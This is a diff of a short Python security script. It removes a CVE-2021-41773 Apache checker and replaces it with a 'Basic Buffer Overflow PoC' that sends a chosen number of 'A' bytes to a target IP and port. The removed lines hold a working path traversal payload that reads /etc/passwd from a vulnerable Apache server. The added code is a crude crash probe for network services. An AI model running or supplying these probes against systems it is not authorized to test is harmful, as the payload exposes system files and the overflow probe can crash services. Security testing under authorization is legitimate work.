@@ -1,40 +1,26 @@
+import socket
 import sys
-import requests
 
 print("=========================================")
-print("CVE-2021-41773 Checker")
+print("Basic Buffer Overflow PoC")
 print("=========================================")
 
-if len(sys.argv) != 2:
-    print("Usage: python cve_check.py <url>")
+if len(sys.argv) != 4:
+    print("Usage: python bof_poc.py <ip> <port> <payload_size>")
     sys.exit(1)
 
-target = sys.argv[1]
+target_ip = sys.argv[1]
+target_port = int(sys.argv[2])
+payload_size = int(sys.argv[3])
 
-try:
-    response = requests.get(target, timeout=5)
+payload = "A" * payload_size
 
-    server = response.headers.get("Server", "")
-    print("[*] Server header:", server)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+s.send(payload.encode())
+s.close()
 
-    if "Apache/2.4.49" not in server:
-        print("[-] Target not vulnerable (version mismatch)")
-        sys.exit(0)
-
-    print("[+] Vulnerable Apache version detected")
-
-    payload = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-    probe_url = target + payload
-
-    probe_response = requests.get(probe_url, timeout=5)
-
-    if "root:x" in probe_response.text:
-        print("[+] Vulnerable! Path traversal confirmed")
-    else:
-        print("[-] Probe sent but no sensitive file leaked")
-
-except Exception as e:
-    print("Error:", e)
+print(f"Sent payload of size: {payload_size}")
 
 print("\n=========================================")
 print("Developed by sudo_0xksh")
